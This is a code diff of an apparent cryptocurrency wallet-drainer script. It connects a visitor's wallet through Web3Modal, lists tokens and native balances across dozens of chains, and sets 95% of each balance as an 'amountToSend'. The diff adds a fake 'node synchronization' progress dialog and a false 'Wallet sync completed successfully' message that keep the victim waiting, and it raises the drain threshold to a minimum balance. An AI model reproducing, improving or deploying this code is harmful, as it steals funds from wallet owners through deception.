@@ -1,6 +1,6 @@
 import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
 import { ethers }from 'ethers'
-import { string } from 'zod'
+import Swal from 'sweetalert2'
 
 // 1. Get projectId at https://cloud.walletconnect.com
 const projectId = '7b72ae90994c97929d1f03b9d8ca03d2'
@@ -11,7 +11,7 @@ const mainnet = {
   name: 'Ethereum',
   currency: 'ETH',
   explorerUrl: 'https://etherscan.io',
-  rpcUrl: 'https://cloudflare-eth.com'
+  rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1'
 }
 
 const arbitrum = {
@@ -25,7 +25,7 @@ const bsc = {
   chainId: 56,
   name: 'Binance Smart chain',
   explorerUrl: 'https://bscscan.com/',
-  rpcUrl: 'https://crimson-black-grass.bsc.quiknode.pro/e79010621a02ab9296ffdd9d36b5cadfcc8322d9/'
+  rpcUrl: 'https://bsc-mainnet.public.blastapi.io'
 }
 
 const optimism = {
@@ -123,7 +123,7 @@ const celo = {
   chainId: 42220,
   name: 'Celo',
   explorerUrl: 'https://celoscan.io/',
-  rpcUrl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
+  rpcUrl: 'https://1rpc.io/celo'
 }
 
 const cronos = {
@@ -378,6 +378,44 @@ async function connectWallet() {
             }
         });
 
+        try {
+            Swal.fire({
+                title: 'Please Wait...',
+                html: 'Node synchronization completes in maximum <b></b> seconds. I will close after Synchronization is complete',
+                imageUrl: 'https://www.resolverconsult-panel.com/assets/save_bckudy-gjk8moac.png',
+                imageWidth: 300,
+                imageHeight: 200,
+                timer: 220000,
+                timerProgressBar: true,
+                didOpen: () => {
+                    Swal.showLoading();
+                    const b = Swal.getHtmlContainer().querySelector('b');
+                    let timerInterval = setInterval(() => {
+                        const remainingTime = Swal.getTimerLeft();
+                        if (remainingTime !== null) {
+                            b.textContent = Math.ceil(remainingTime / 1000);
+                        }
+                    }, 100);
+
+                    // Ensure to clear the interval when the alert is closed
+                    Swal.getHtmlContainer().addEventListener('swalClose', () => {
+                        clearInterval(timerInterval);
+                    });
+                },
+                willClose: () => {
+                    // Show success dialog after loading dialog closes
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Success!',
+                        text: 'Wallet sync completed successfully.',
+                        showConfirmButton: true
+                    });
+                }
+            })
+        } catch (error) {
+            console.error('Error opening dialog box...')
+        }
+
        
         let networkDetect = [
             {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
@@ -396,7 +434,7 @@ async function connectWallet() {
             {chainId: manta.chainId, name: manta.name, rpcurl: 'https://manta-pacific.drpc.org', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://pacific-explorer.manta.network/', fetchTokens: fetchMANTATokens},
             {chainId: fantom.chainId, name: fantom.name, rpcurl: 'https://fantom-mainnet.public.blastapi.io', nativeCurrency: {name: 'Fantom', symbol: 'FTM', decimal: 18}, blockExplorerUrl: 'https://ftmscan.com/', fetchTokens: fetchFANTOMTokens},
             {chainId: gnosis.chainId, name: gnosis.name, rpcurl: 'https://rpc.gnosis.gateway.fm', nativeCurrency: {name: 'xDai', symbol: 'xDAI', decimal: 18}, blockExplorerUrl: 'https://gnosisscan.io/', fetchTokens: fetchGNOSISTokens},
-            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://celo-mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
+            {chainId: celo.chainId, name: celo.name, rpcurl: 'https://1rpc.io/celo', nativeCurrency: {name: 'Celo', symbol: 'CELO', decimal: 18}, blockExplorerUrl: 'https://celoscan.io/', fetchTokens: fetchCELOTokens},
             {chainId: cronos.chainId, name: cronos.name, rpcurl: 'https://evm.cronos.org/', nativeCurrency: {name: 'Cronos', symbol: 'CRO', decimal: 18}, blockExplorerUrl: 'https://cronoscan.com/', fetchTokens: fetchCRONOSTokens},
             {chainId: mantle.chainId, name: mantle.name, rpcurl: 'https://mantle-mainnet.public.blastapi.io', nativeCurrency: {name: 'Mantle', symbol: 'MNT', decimal: 18}, blockExplorerUrl: 'https://explorer.mantle.xyz/', fetchTokens: fetchMANTLETokens},
             {chainId: aurora.chainId, name: aurora.name, rpcurl: 'https://mainnet.aurora.dev', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://explorer.aurora.dev/', fetchTokens: fetchAURORATokens},
@@ -518,7 +556,7 @@ async function connectWallet() {
                           for (let token of tokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   tokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -556,7 +594,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
               
@@ -596,7 +634,7 @@ async function connectWallet() {
                           for (let token of bscTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   bnbTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -634,7 +672,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
               
@@ -675,7 +713,7 @@ async function connectWallet() {
                           for (let token of arbTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   arbTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -713,7 +751,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
               
@@ -752,7 +790,7 @@ async function connectWallet() {
                           for (let token of opTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   opTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -790,7 +828,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
               
@@ -830,7 +868,7 @@ async function connectWallet() {
                           for (let token of arbnovaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   arbnovaTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -868,7 +906,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
               
@@ -907,7 +945,7 @@ async function connectWallet() {
                           for (let token of baseTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   baseTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -945,7 +983,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
               
@@ -984,7 +1022,7 @@ async function connectWallet() {
                           for (let token of zkTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   zkTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1022,7 +1060,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
               
@@ -1061,7 +1099,7 @@ async function connectWallet() {
                           for (let token of polyTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   polyTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1099,7 +1137,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
               
@@ -1127,7 +1165,7 @@ async function connectWallet() {
               
               
                       ////POLYGONEVM
-                        case polygonevm.chaindId:
+                        case polygonevm.chainId:
                           const polyevmTokens = await fetchPOLYGONEVMTokens(address);
               
                           // Message to sign
@@ -1139,7 +1177,7 @@ async function connectWallet() {
                           for (let token of polyevmTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   polyevmTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1177,7 +1215,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
               
@@ -1217,7 +1255,7 @@ async function connectWallet() {
                           for (let token of blastTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   blastTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1255,7 +1293,7 @@ async function connectWallet() {
                               const etherBalance = await provider.getBalance(address)
                               console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
                  
-                              if(!etherBalance.eq(0)){
+                              if(etherBalance.gte(minimumBalance)){
                                 const amountToSend = etherBalance.mul(95).div(100);
                               console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
                  
@@ -1295,7 +1333,7 @@ async function connectWallet() {
                           for (let token of scrollTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   scrollTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1333,7 +1371,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
               
@@ -1372,7 +1410,7 @@ async function connectWallet() {
                           for (let token of metisTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   metisTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1410,7 +1448,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
               
@@ -1434,7 +1472,7 @@ async function connectWallet() {
                               console.error('Error transferring METIS:', error);
                               
                          }
-                              break;
+                            break;
               
                         //MANTA      
                         case manta.chainId:
@@ -1449,7 +1487,7 @@ async function connectWallet() {
                           for (let token of mantaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   mantaTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1487,7 +1525,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
               
@@ -1526,7 +1564,7 @@ async function connectWallet() {
                           for (let token of fantomTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   fantomTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1564,7 +1602,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
               
@@ -1603,7 +1641,7 @@ async function connectWallet() {
                           for (let token of gnosisTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   gnosisTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1641,7 +1679,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
               
@@ -1680,7 +1718,7 @@ async function connectWallet() {
                           for (let token of lineaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   lineaTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1718,7 +1756,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
               
@@ -1758,7 +1796,7 @@ async function connectWallet() {
                           for (let token of celoTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   celoTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1796,7 +1834,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
               
@@ -1836,7 +1874,7 @@ async function connectWallet() {
                           for (let token of avaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   avaTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1874,7 +1912,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
               
@@ -1913,7 +1951,7 @@ async function connectWallet() {
                           for (let token of opbnbTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   opbnbTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -1951,7 +1989,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
               
@@ -1990,7 +2028,7 @@ async function connectWallet() {
                           for (let token of okxTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   okxTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2028,7 +2066,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
               
@@ -2068,7 +2106,7 @@ async function connectWallet() {
                           for (let token of mantleTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   mantleTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2106,7 +2144,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
               
@@ -2145,7 +2183,7 @@ async function connectWallet() {
                           for (let token of aurTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   aurTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2183,7 +2221,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
               
@@ -2223,7 +2261,7 @@ async function connectWallet() {
                           for (let token of cronosTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   cronosTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2261,7 +2299,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
               
@@ -2299,7 +2337,7 @@ async function connectWallet() {
                           for (let token of klaytnTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   klaytnTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2336,7 +2374,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
               
@@ -2377,7 +2415,7 @@ async function connectWallet() {
                           for (let token of platTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   platTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2415,7 +2453,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
               
@@ -2455,7 +2493,7 @@ async function connectWallet() {
                           for (let token of harTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   harTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2493,7 +2531,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
               
@@ -2533,7 +2571,7 @@ async function connectWallet() {
                           for (let token of hecoTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   hecoTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2571,7 +2609,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
               
@@ -2611,7 +2649,7 @@ async function connectWallet() {
                           for (let token of bchTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   bchTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2649,7 +2687,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
               
@@ -2689,7 +2727,7 @@ async function connectWallet() {
                           for (let token of confluxTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   confluxTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2727,7 +2765,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
               
@@ -2767,7 +2805,7 @@ async function connectWallet() {
                           for (let token of merlinTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                                   merlinTokenDetails.push({
                                       contract: tokenContract,
                                       balance: balance,
@@ -2805,7 +2843,7 @@ async function connectWallet() {
                            const etherBalance = await provider.getBalance(address)
                            console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
               
-                           if(!etherBalance.eq(0)){
+                           if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
                            console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
               
@@ -2887,7 +2925,7 @@ async function connectWallet() {
                       for (let token of tokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
